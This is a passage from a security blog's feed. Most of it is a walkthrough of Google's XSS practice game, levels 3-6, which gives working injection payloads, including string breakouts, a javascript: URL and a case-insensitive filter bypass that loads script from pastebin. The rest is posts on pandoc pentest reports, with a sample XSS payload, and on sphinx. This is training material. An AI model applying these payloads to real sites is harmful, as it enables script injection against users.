<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">https://xss-game.appspot.com/level3/frame#3&#39; onerror=&#39;alert(1)&#39;;
</code></pre></div><h2 id="level-4">Level 4</h2>
<p>This is quite tricky. This time I have followed the provided hints. Having the JS console activated and requesting <code>https://xss-game.appspot.com/level4/frame?timer='</code> showed me following output:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">SyntaxError: unterminated string literal

startTimer(<span style="color:#ed9d13">&#39;&#39;</span><span style="color:#a61717;background-color:#e3d2d2">&#39;</span>);
</code></pre></div><p>Obviously there is again a way to escape the function and append the <code>alert()</code> call. I have tried several things:</p>
<ul>
<li><a href="https://xss-game.appspot.com/level4/frame?timer=');">https://xss-game.appspot.com/level4/frame?timer=');</a></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">    SyntaxError: unterminated string literal

    startTimer(<span style="color:#ed9d13">&#39;&#39;</span>)<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>);
</code></pre></div><ul>
<li><a href="https://xss-game.appspot.com/level4/frame?timer=')&amp;#59;">https://xss-game.appspot.com/level4/frame?timer=')&amp;#59;</a></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">    SyntaxError: unterminated string literal


    startTimer(<span style="color:#ed9d13">&#39;&#39;</span>)<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>);
</code></pre></div><p>And then I&rsquo;ve decided to use some URL encoding: <code>%3B</code> represents the semi-colon.</p>
<ul>
<li><a href="https://xss-game.appspot.com/level4/frame?timer=')%3B">https://xss-game.appspot.com/level4/frame?timer=')%3B</a></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">    SyntaxError: unterminated string literal


    startTimer(<span style="color:#ed9d13">&#39;&#39;</span>);<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>);
</code></pre></div><p>Aha.. There you go! We can terminate the call and insert other ones. The <strong>final request</strong>:</p>
<ul>
<li><a href="https://xss-game.appspot.com/level4/frame?timer=')%3Balert(1)%3Bvar">https://xss-game.appspot.com/level4/frame?timer=')%3Balert(1)%3Bvar</a> b=('</li>
</ul>
<p>which resulted in</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">startTimer(&#39;&#39;);alert(1);var b=(&#39;&#39;);
</code></pre></div><p>I must admit: Nice one!</p>
<h2 id="level-5">Level 5</h2>
<p>This one was quite easy. On the first page you can see a link: <code>https://xss-game.appspot.com/level5/frame/signup?next=confirm</code>. Now let&rsquo;s have a look how this <code>next</code> parameter is used in <code>confirm.html</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">[...]
&lt;script&gt;
      setTimeout(<span style="color:#6ab825;font-weight:bold">function</span>() { <span style="color:#24909d">window</span>.location = <span style="color:#ed9d13">&#39;{{ next }}&#39;</span>; }, <span style="color:#3677a9">5000</span>);
&lt;<span style="color:#a61717;background-color:#e3d2d2">/script&gt;</span>
[...]
</code></pre></div><p>So the window.location is set based on the <code>next</code> parameter. This is a typical case for <em>DOM based XSS</em>.  Besides that we have in <code>signup.html</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">[...]
&lt;br&gt;&lt;br&gt;
    &lt;a href=<span style="color:#ed9d13">&#34;{{ next }}&#34;</span>&gt;Next &gt;&gt;&lt;<span style="color:#a61717;background-color:#e3d2d2">/a&gt;</span>
&lt;<span style="color:#a61717;background-color:#e3d2d2">/body&gt;</span>
[...]
</code></pre></div><p>Again the <code>next</code> parameter is used as an <code>a</code> tag target. Ok, enough bla bla. Here is the PoC:</p>
<ul>
<li>Go to <code>https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)</code></li>
<li>Insert your Mail</li>
<li>Click <code>Next &gt;&gt;</code></li>
<li>Voila!</li>
</ul>
<h2 id="level-6">Level 6</h2>
<p>This time I had to figure to host my JS code. So I&rsquo;ve used <code>pastebin.com</code> to host my <a href="http://pastebin.com/raw.php?i=rTRPYeNk">evil code</a>. Next I had a look at the code. As you can read a new <code>script</code> tag is created and the <code>src</code> attribute is set appropriately. The only catch about it: You&rsquo;re not allowed to have a URL containing <em>https?</em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">[...]
      <span style="color:#6ab825;font-weight:bold">if</span> (url.match(<span style="color:#ed9d13">/^https?:\/\//</span>)) {
        setInnerText(<span style="color:#24909d">document</span>.getElementById(<span style="color:#ed9d13">&#34;log&#34;</span>),
          <span style="color:#ed9d13">&#34;Sorry, cannot load a URL containing \&#34;http\&#34;.&#34;</span>);
        <span style="color:#6ab825;font-weight:bold">return</span>;
      }
[...]
</code></pre></div><p>Afterwards the text after the hash is used as the scripts src:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#999;font-style:italic">// Load this awesome gadget
</span><span style="color:#999;font-style:italic"></span>scriptEl.src = url;
</code></pre></div><p>Have you noticed something about the regexp? No?! Seriously not? Ok. It&rsquo;s <strong>not</strong> case-sensitive. You can escape it by using <em>hTTps</em> or any other combination. So the <strong>final PoC</strong>:</p>
<ul>
<li><a href="https://xss-game.appspot.com/level6/frame#htTps://pastebin.com/raw.php?i=15S5qZs0">https://xss-game.appspot.com/level6/frame#htTps://pastebin.com/raw.php?i=15S5qZs0</a></li>
</ul>
<h2 id="conclusion">Conclusion</h2>
<p>This was a great game to play with. After all I must say the levels were not that difficult but a really good opportunity to refresh my XSS skills :)</p>]]></content:encoded>
    </item>
    
    <item>
      <title>BerlinSides 0x05</title>
      <link>https://blog.dornea.nu/2014/05/27/berlinsides-0x05/</link>
      <pubDate>Tue, 27 May 2014 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2014/05/27/berlinsides-0x05/</guid>
      <content:encoded><![CDATA[<p>The <a href="http://berlinsides.org/"><strong>BerlinSides</strong></a> is a conference from hacker for hacker. This years motto was: <strong>&hellip;you ain&rsquo;t listening</strong>.
All my greetings go to:</p>
<ul>
<li><a href="http://nullsecurity.net">nullsecurity.net</a></li>
<li><a href="https://twitter.com/thealuc">Aluc</a></li>
<li><a href="http://www.universalhall.de/">Universal Hall Team</a></li>
</ul>
<p><img src="/posts/img/2014/berlinsides/382f305b366cbb0d544207ae28eff003.jpg" alt="Nullsecurity @ BerlinSides 0x05"></p>
<p><img src="/posts/img/2014/berlinsides/48aa1cf9082a5fab4172f49cb2f890c3.jpg" alt="BerlinSides"></p>
<p><img src="/posts/img/2014/berlinsides/799eb9f276fed2ef043b83af21c41094.jpg" alt="BerlinSides"></p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HowTo: Write pentest reports the easy way</title>
      <link>https://blog.dornea.nu/2014/05/20/howto-write-pentest-reports-the-easy-way/</link>
      <pubDate>Tue, 20 May 2014 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2014/05/20/howto-write-pentest-reports-the-easy-way/</guid>
      <content:encoded><![CDATA[<p>In this post I&rsquo;ll try to share an idea I&rsquo;ve had regarding pentest reports. Most of you surely have
their own methods and tools to create nice looking reports after have done some pentesting.
Since I try to keep things simple I&rsquo;ll give you a rough idea how this could be done without Excel &amp; Co.</p>
<h2 id="scenario">Scenario</h2>
<p>Suppose you conduct a pentest and take notes during it. Afterwards you&rsquo;ll be probably be copy&amp;paste&rsquo;integratedP
the whole content into a layout or pre-defined document. But what if you could take notes <strong>and</strong>
use them as content for your report without changing anything? I usually have one file where I write
down my thoughts and findings. In the past I had to copy the relevant text paragraphs and include them
at the right place in my final document.</p>
<p>Wouldn&rsquo;t be more comfortable to write down your notes only <strong>once</strong> and then generate the report upon
your notes? Well this is where <a href="http://johnmacfarlane.net/pandoc/index.html">pandoc</a> comes in place.</p>
<h2 id="pandoc">pandoc</h2>
<p>Short summary about this great tool:</p>
<blockquote>
<p>Pandoc understands a number of useful markdown syntax extensions,
including document metadata (title, author, date); footnotes; tables;
definition lists; superscript and subscript; strikeout; enhanced ordered
lists (start number and numbering style are significant); running example lists;
delimited code blocks with syntax highlighting; smart quotes, dashes, and ellipses;
markdown inside HTML blocks; and inline LaTeX. If strict markdown compatibility is desired,
all of these extensions can be turned off.</p>
</blockquote>
<p>Infact you can convert documents into (almost) every possible format and vice-versa! Isn&rsquo;t that cool :)?
Make sure you have a look at the <a href="http://johnmacfarlane.net/pandoc/demos.html">examples</a> to get an
impression what this tool is capable of.</p>
<h2 id="the-idea">The idea&hellip;</h2>
<p>I&rsquo;ll try to explain the whole process using a figure:</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    Graphviz code
    
  </summary>
  <pre><code>digraph {
  node [shape=circle,fontsize=8,fixedsize=true,width=0.9];
  edge [fontsize=8];
  rankdir=LR;

  &quot;pandoc&quot; [shape=&quot;doublecircle&quot; color=&quot;orange&quot;];
  &quot;output&quot; [shape=&quot;doublecircle&quot; color=&quot;orange&quot;];

  &quot;Document 1&quot; -&gt; &quot;pandoc&quot;;
  &quot;Document 2&quot; -&gt; &quot;pandoc&quot;;
  &quot;Document 3&quot; -&gt; &quot;pandoc&quot;;

  &quot;pandoc&quot; -&gt; &quot;output&quot; [label=&quot;convert&quot;];
  &quot;output&quot; -&gt; &quot;PDF&quot;;
  &quot;output&quot; -&gt; &quot;HTML&quot;;
  &quot;output&quot; -&gt; &quot;LaTeX&quot;;
  &quot;output&quot; -&gt; &quot;XML&quot;;
}
</code></pre>

</details>

<p><img src="/posts/img/2014/howto-pentest/idea.dot.png" alt="stack"></p>
<p>So take a document run it through pandoc and you&rsquo;ll get a lot of possible output formats. Especially
the <strong>PDF</strong> output and the <strong>LaTeX</strong> will surely help you get the most out of your notes. You might
want to use <strong>XML</strong> as well if you tend to save your results in a DB to process them later on.</p>
<h2 id="quickstart">Quickstart</h2>
<p>Let&rsquo;s suppose we are done with our pentest and wrote down some notes. I&rsquo;ll use <strong>Markdown</strong> for the
syntax since it is very easy to use and already integrated within GitHub &amp; Co. The source file I&rsquo;ll be
using:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-markdown" data-lang="markdown"><span style="color:#fff;font-weight:bold"># Summary
</span><span style="color:#fff;font-weight:bold"></span>
<span style="color:#fff;text-decoration:underline">## Host
</span><span style="color:#fff;text-decoration:underline"></span>
http://dornea.nu

<span style="color:#fff;text-decoration:underline">## Date
</span><span style="color:#fff;text-decoration:underline"></span>
2014-03-10


<span style="color:#fff;font-weight:bold"># Vulns
</span><span style="color:#fff;font-weight:bold"></span><span style="color:#fff;text-decoration:underline">## SQLi
</span><span style="color:#fff;text-decoration:underline"></span>
<span style="color:#fff;text-decoration:underline">### Description
</span><span style="color:#fff;text-decoration:underline"></span>
Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod
tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,
quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo
consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse
cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non
proident, sunt in culpa qui officia deserunt mollit anim id est laborum.


<span style="color:#fff;text-decoration:underline">### Severity
</span><span style="color:#fff;text-decoration:underline"></span>
High

<span style="color:#fff;text-decoration:underline">### PoC
</span><span style="color:#fff;text-decoration:underline"></span>
<span style="color:#6ab825;font-weight:bold">*</span> Input

    ~~~
    &lt;<span style="color:#6ab825;font-weight:bold">HTML</span>&gt;&lt;<span style="color:#6ab825;font-weight:bold">BODY</span>&gt;
    <span style="color:#a61717;background-color:#e3d2d2">&lt;</span>?xml:namespace prefix=&#34;t&#34; ns=&#34;urn:schemas-microsoft-com:time&#34;&gt;
    <span style="color:#a61717;background-color:#e3d2d2">&lt;</span>?import namespace=&#34;t&#34; implementation=&#34;#default#time2&#34;&gt;
    &lt;<span style="color:#6ab825;font-weight:bold">t:set</span> <span style="color:#bbb">attributeName</span>=<span style="color:#ed9d13">&#34;innerHTML&#34;</span> <span style="color:#bbb">to</span>=<span style="color:#ed9d13">&#34;XSS&lt;SCRIPT DEFER&gt;alert(&#34;</span><span style="color:#bbb">XSS</span><span style="color:#a61717;background-color:#e3d2d2">&#34;)&lt;/</span><span style="color:#bbb">SCRIPT</span>&gt;&#34;&gt;
    &lt;/<span style="color:#6ab825;font-weight:bold">BODY</span>&gt;&lt;/<span style="color:#6ab825;font-weight:bold">HTML</span>&gt;
    ~~~

<span style="color:#6ab825;font-weight:bold">*</span> Output

    ~~~
    here comes the output
    ~~~


<span style="color:#fff;text-decoration:underline">## Information Disclosure
</span><span style="color:#fff;text-decoration:underline"></span>
<span style="color:#fff;text-decoration:underline">### Description
</span><span style="color:#fff;text-decoration:underline"></span>
Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod
tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,
quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo
consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse
cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non
proident, sunt in culpa qui officia deserunt mollit anim id est laborum.

<span style="color:#fff;text-decoration:underline">### Severity
</span><span style="color:#fff;text-decoration:underline"></span>
Low


<span style="color:#fff;text-decoration:underline">### PoC
</span><span style="color:#fff;text-decoration:underline"></span>
<span style="color:#6ab825;font-weight:bold">*</span> Input

    ~~~
    here ist the poc
    ~~~

</code></pre></div><p>Now we&rsquo;ll be using <strong>pandoc</strong> in order to convert the notes into a parseable form like <strong>JSON</strong> or <strong>XML</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ~/.cabal/bin/pandoc -s -S -t docbook test.markdown -o test.xml
</code></pre></div><h3 id="convert-to-xml">Convert to XML</h3>
<p>This will convert you Markdown code into a <a href="http://www.docbook.org/">DocBook</a> based XML file. The output will be:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#cd2828;font-weight:bold">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34; ?&gt;</span>
<span style="color:#cd2828;font-weight:bold">&lt;!DOCTYPE article PUBLIC &#34;-//OASIS//DTD DocBook XML V4.5//EN&#34;     &#34;http://www.oasis-open.org/docbook/xml/4.5/docbookx.dtd&#34;&gt;</span>
<span style="color:#6ab825;font-weight:bold">&lt;article&gt;</span>
  <span style="color:#6ab825;font-weight:bold">&lt;articleinfo&gt;</span>
    <span style="color:#6ab825;font-weight:bold">&lt;title&gt;&lt;/title&gt;</span>
  <span style="color:#6ab825;font-weight:bold">&lt;/articleinfo&gt;</span>
<span style="color:#6ab825;font-weight:bold">&lt;sect1</span> <span style="color:#bbb">id=</span><span style="color:#ed9d13">&#34;summary&#34;</span><span style="color:#6ab825;font-weight:bold">&gt;</span>
  <span style="color:#6ab825;font-weight:bold">&lt;title&gt;</span>Summary<span style="color:#6ab825;font-weight:bold">&lt;/title&gt;</span>
  <span style="color:#6ab825;font-weight:bold">&lt;sect2</span> <span style="color:#bbb">id=</span><span style="color:#ed9d13">&#34;host&#34;</span><span style="color:#6ab825;font-weight:bold">&gt;</span>
    <span style="color:#6ab825;font-weight:bold">&lt;title&gt;</span>Host<span style="color:#6ab825;font-weight:bold">&lt;/title&gt;</span>
    <span style="color:#6ab825;font-weight:bold">&lt;para&gt;</span>
      http://dornea.nu
    <span style="color:#6ab825;font-weight:bold">&lt;/para&gt;</span>
  <span style="color:#6ab825;font-weight:bold">&lt;/sect2&gt;</span>
  <span style="color:#6ab825;font-weight:bold">&lt;sect2</span> <span style="color:#bbb">id=</span><span style="color:#ed9d13">&#34;date&#34;</span><span style="color:#6ab825;font-weight:bold">&gt;</span>
    <span style="color:#6ab825;font-weight:bold">&lt;title&gt;</span>Date<span style="color:#6ab825;font-weight:bold">&lt;/title&gt;</span>
    <span style="color:#6ab825;font-weight:bold">&lt;para&gt;</span>
      2014-03-10
    <span style="color:#6ab825;font-weight:bold">&lt;/para&gt;</span>
  <span style="color:#6ab825;font-weight:bold">&lt;/sect2&gt;</span>
<span style="color:#6ab825;font-weight:bold">&lt;/sect1&gt;</span>
<span style="color:#6ab825;font-weight:bold">&lt;sect1</span> <span style="color:#bbb">id=</span><span style="color:#ed9d13">&#34;vulns&#34;</span><span style="color:#6ab825;font-weight:bold">&gt;</span>
  <span style="color:#6ab825;font-weight:bold">&lt;title&gt;</span>Vulns<span style="color:#6ab825;font-weight:bold">&lt;/title&gt;</span>
  <span style="color:#6ab825;font-weight:bold">&lt;sect2</span> <span style="color:#bbb">id=</span><span style="color:#ed9d13">&#34;sqli&#34;</span><span style="color:#6ab825;font-weight:bold">&gt;</span>
    <span style="color:#6ab825;font-weight:bold">&lt;title&gt;</span>SQLi<span style="color:#6ab825;font-weight:bold">&lt;/title&gt;</span>
    <span style="color:#6ab825;font-weight:bold">&lt;sect3</span> <span style="color:#bbb">id=</span><span style="color:#ed9d13">&#34;description&#34;</span><span style="color:#6ab825;font-weight:bold">&gt;</span>
      <span style="color:#6ab825;font-weight:bold">&lt;title&gt;</span>Description<span style="color:#6ab825;font-weight:bold">&lt;/title&gt;</span>
      <span style="color:#6ab825;font-weight:bold">&lt;para&gt;</span>
        Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do
        eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut
        enim ad minim veniam, quis nostrud exercitation ullamco laboris
        nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor
        in reprehenderit in voluptate velit esse cillum dolore eu fugiat
        nulla pariatur. Excepteur sint occaecat cupidatat non proident,
        sunt in culpa qui officia deserunt mollit anim id est laborum.
      <span style="color:#6ab825;font-weight:bold">&lt;/para&gt;</span>
    <span style="color:#6ab825;font-weight:bold">&lt;/sect3&gt;</span>
    <span style="color:#6ab825;font-weight:bold">&lt;sect3</span> <span style="color:#bbb">id=</span><span style="color:#ed9d13">&#34;severity&#34;</span><span style="color:#6ab825;font-weight:bold">&gt;</span>
      <span style="color:#6ab825;font-weight:bold">&lt;title&gt;</span>Severity<span style="color:#6ab825;font-weight:bold">&lt;/title&gt;</span>
      <span style="color:#6ab825;font-weight:bold">&lt;para&gt;</span>
        High
      <span style="color:#6ab825;font-weight:bold">&lt;/para&gt;</span>
    <span style="color:#6ab825;font-weight:bold">&lt;/sect3&gt;</span>
    <span style="color:#6ab825;font-weight:bold">&lt;sect3</span> <span style="color:#bbb">id=</span><span style="color:#ed9d13">&#34;poc&#34;</span><span style="color:#6ab825;font-weight:bold">&gt;</span>
      <span style="color:#6ab825;font-weight:bold">&lt;title&gt;</span>PoC<span style="color:#6ab825;font-weight:bold">&lt;/title&gt;</span>
      <span style="color:#6ab825;font-weight:bold">&lt;itemizedlist&gt;</span>
        <span style="color:#6ab825;font-weight:bold">&lt;listitem&gt;</span>
          <span style="color:#6ab825;font-weight:bold">&lt;para&gt;</span>
            Input
          <span style="color:#6ab825;font-weight:bold">&lt;/para&gt;</span>
          <span style="color:#6ab825;font-weight:bold">&lt;programlisting&gt;</span>
&amp;lt;HTML&amp;gt;&amp;lt;BODY&amp;gt;
&amp;lt;?xml:namespace prefix=&amp;quot;t&amp;quot; ns=&amp;quot;urn:schemas-microsoft-com:time&amp;quot;&amp;gt;
&amp;lt;?import namespace=&amp;quot;t&amp;quot; implementation=&amp;quot;#default#time2&amp;quot;&amp;gt;
&amp;lt;t:set attributeName=&amp;quot;innerHTML&amp;quot; to=&amp;quot;XSS&amp;lt;SCRIPT DEFER&amp;gt;alert(&amp;quot;XSS&amp;quot;)&amp;lt;/SCRIPT&amp;gt;&amp;quot;&amp;gt;
&amp;lt;/BODY&amp;gt;&amp;lt;/HTML&amp;gt;
<span style="color:#6ab825;font-weight:bold">&lt;/programlisting&gt;</span>
        <span style="color:#6ab825;font-weight:bold">&lt;/listitem&gt;</span>
        <span style="color:#6ab825;font-weight:bold">&lt;listitem&gt;</span>
          <span style="color:#6ab825;font-weight:bold">&lt;para&gt;</span>
            Output
          <span style="color:#6ab825;font-weight:bold">&lt;/para&gt;</span>
          <span style="color:#6ab825;font-weight:bold">&lt;programlisting&gt;</span>
here comes the output
<span style="color:#6ab825;font-weight:bold">&lt;/programlisting&gt;</span>
        <span style="color:#6ab825;font-weight:bold">&lt;/listitem&gt;</span>
      <span style="color:#6ab825;font-weight:bold">&lt;/itemizedlist&gt;</span>
    <span style="color:#6ab825;font-weight:bold">&lt;/sect3&gt;</span>
  <span style="color:#6ab825;font-weight:bold">&lt;/sect2&gt;</span>
  <span style="color:#6ab825;font-weight:bold">&lt;sect2</span> <span style="color:#bbb">id=</span><span style="color:#ed9d13">&#34;information-disclosure&#34;</span><span style="color:#6ab825;font-weight:bold">&gt;</span>
    <span style="color:#6ab825;font-weight:bold">&lt;title&gt;</span>Information Disclosure<span style="color:#6ab825;font-weight:bold">&lt;/title&gt;</span>
    <span style="color:#6ab825;font-weight:bold">&lt;sect3</span> <span style="color:#bbb">id=</span><span style="color:#ed9d13">&#34;description-1&#34;</span><span style="color:#6ab825;font-weight:bold">&gt;</span>
      <span style="color:#6ab825;font-weight:bold">&lt;title&gt;</span>Description<span style="color:#6ab825;font-weight:bold">&lt;/title&gt;</span>
      <span style="color:#6ab825;font-weight:bold">&lt;para&gt;</span>
        Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do
        eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut
        enim ad minim veniam, quis nostrud exercitation ullamco laboris
        nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor
        in reprehenderit in voluptate velit esse cillum dolore eu fugiat
        nulla pariatur. Excepteur sint occaecat cupidatat non proident,
        sunt in culpa qui officia deserunt mollit anim id est laborum.
      <span style="color:#6ab825;font-weight:bold">&lt;/para&gt;</span>
    <span style="color:#6ab825;font-weight:bold">&lt;/sect3&gt;</span>
    <span style="color:#6ab825;font-weight:bold">&lt;sect3</span> <span style="color:#bbb">id=</span><span style="color:#ed9d13">&#34;severity-1&#34;</span><span style="color:#6ab825;font-weight:bold">&gt;</span>
      <span style="color:#6ab825;font-weight:bold">&lt;title&gt;</span>Severity<span style="color:#6ab825;font-weight:bold">&lt;/title&gt;</span>
      <span style="color:#6ab825;font-weight:bold">&lt;para&gt;</span>
        Low
      <span style="color:#6ab825;font-weight:bold">&lt;/para&gt;</span>
    <span style="color:#6ab825;font-weight:bold">&lt;/sect3&gt;</span>
    <span style="color:#6ab825;font-weight:bold">&lt;sect3</span> <span style="color:#bbb">id=</span><span style="color:#ed9d13">&#34;poc-1&#34;</span><span style="color:#6ab825;font-weight:bold">&gt;</span>
      <span style="color:#6ab825;font-weight:bold">&lt;title&gt;</span>PoC<span style="color:#6ab825;font-weight:bold">&lt;/title&gt;</span>
      <span style="color:#6ab825;font-weight:bold">&lt;itemizedlist&gt;</span>
        <span style="color:#6ab825;font-weight:bold">&lt;listitem&gt;</span>
          <span style="color:#6ab825;font-weight:bold">&lt;para&gt;</span>
            Input
          <span style="color:#6ab825;font-weight:bold">&lt;/para&gt;</span>
          <span style="color:#6ab825;font-weight:bold">&lt;programlisting&gt;</span>
here ist the poc
<span style="color:#6ab825;font-weight:bold">&lt;/programlisting&gt;</span>
        <span style="color:#6ab825;font-weight:bold">&lt;/listitem&gt;</span>
      <span style="color:#6ab825;font-weight:bold">&lt;/itemizedlist&gt;</span>
    <span style="color:#6ab825;font-weight:bold">&lt;/sect3&gt;</span>
  <span style="color:#6ab825;font-weight:bold">&lt;/sect2&gt;</span>
<span style="color:#6ab825;font-weight:bold">&lt;/sect1&gt;</span>
<span style="color:#6ab825;font-weight:bold">&lt;/article&gt;</span>
</code></pre></div><p>You could now use this <strong>XML</strong> file to import your notes into a DB (e.g. SQLite) or easily convert it to other layouts using <strong>XSLT</strong>.</p>
<blockquote>
<p>I usually use DB to store all my results. This way I&rsquo;m able to use SQL
queries to extract data and keep a sort of history across the results.</p>
</blockquote>
<h3 id="convert-to-pdf">Convert to PDF</h3>
<p>Or if you&rsquo;re a <strong>LaTeX</strong> freak like me you could use your favourite template and generate your PDF.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ wget http://johnmacfarlane.net/pandoc/demo/mytemplate.tex
$ ~/.cabal/bin/pandoc -N --template=mytemplate.tex --variable <span style="color:#40ffff">fontsize</span>=12pt --variable <span style="color:#40ffff">version</span>=1.10 test.markdown --latex-engine=xelatex --toc -o test.pdf
</code></pre></div><p>And the result:</p>
<p><img src="/posts/img/2014/4d9ac2dfb42b4fba7a1aec07e4d827f1.png" alt="PDF Output"></p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HowTo: Create docs with sphinx</title>
      <link>https://blog.dornea.nu/2014/05/04/howto-create-docs-with-sphinx/</link>
      <pubDate>Sun, 04 May 2014 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2014/05/04/howto-create-docs-with-sphinx/</guid>
      <content:encoded><![CDATA[<p>In this post I&rsquo;d like to show some handy way to improve your process of documentating your project.
Since we all know documentation is a <strong>must</strong> you might have wondered how to handle that
without any big efforts. In fact it would be great if you could write your code along with the
documentation and extract it later on for publishing.</p>
<h2 id="meet-a-hrefhttpsphinx-docorgsphinxa">Meet <a href="http://sphinx-doc.org">sphinx</a></h2>
<p>It is a tool that you&rsquo;ll love! Being more technical:</p>
<blockquote>
<p>It was originally created for the new Python documentation,
and it has excellent facilities for the documentation of Python projects,
but C/C++ is already supported as well, and it is planned to add special support for other languages as well.</p>
</blockquote>
<p>I have found this tool reading some documentation on <a href="https://readthedocs.org/">readthedocs.org</a>. I was very impressed
how <a href="http://sphinx-doc.org/tutorial.html">easy</a> you could document your code and build a documentation format upon on your
needs:</p>
<ul>
<li><a href="http://sphinx-doc.org/latest/builders.html#sphinx.builders.latex.LaTeXBuilder">LatexPDF</a></li>
<li><a href="http://sphinx-doc.org/latest/builders.html#sphinx.builders.html.SingleFileHTMLBuilder">SingleHTML</a></li>
<li><a href="http://sphinx-doc.org/latest/builders.html#sphinx.builders.epub.EpubBuilder">EPUB</a></li>
<li>and many <a href="http://sphinx-doc.org/latest/builders.html">more</a></li>
</ul>
<h2 id="quickstart">Quickstart</h2>
<h3 id="install-tools">Install tools</h3>
<p>First of create a new <a href="http://www.virtualenv.org/en/latest/">virtualenv</a> environment:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ mkdir doku
$ virtualenv doku
Using base prefix &amp;<span style="color:#999;font-style:italic">#039;/usr&amp;#039;</span>
New python executable in doku/bin/python3
Also creating executable in doku/bin/python
Installing setuptools, pip...done.
</code></pre></div><p>Then activate it:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ <span style="color:#24909d">source</span> doku/bin/activate
Ã¢ÂžÂœ  tmp  <span style="color:#24909d">source</span> doku/bin/activate
(doku)Ã¢ÂžÂœ  tmp  <span style="color:#24909d">cd</span> doku
(doku)Ã¢ÂžÂœ  doku  ls -l
total <span style="color:#3677a9">12</span>
drwxr-xr-x <span style="color:#3677a9">2</span> victor users <span style="color:#3677a9">4096</span> May  <span style="color:#3677a9">4</span> 13:37 bin
drwxr-xr-x <span style="color:#3677a9">2</span> victor users <span style="color:#3677a9">4096</span> May  <span style="color:#3677a9">4</span> 13:37 include
drwxr-xr-x <span style="color:#3677a9">3</span> victor users <span style="color:#3677a9">4096</span> May  <span style="color:#3677a9">4</span> 13:37 lib
</code></pre></div><p>Now you&rsquo;ll have to install <strong>sphinx</strong> using <strong>pip</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">(doku) pip install sphinx
Downloading/unpacking sphinx
  Downloading Sphinx-1.2.2-py33-none-any.whl (1.1MB): 1.1MB downloaded
Downloading/unpacking docutils&gt;=0.10 (from sphinx)
  Downloading docutils-0.11.tar.gz (1.6MB): 1.6MB downloaded
  Running setup.py (path:/home/victor/tmp/doku/build/docutils/setup.py) egg_info <span style="color:#6ab825;font-weight:bold">for</span> package docutils

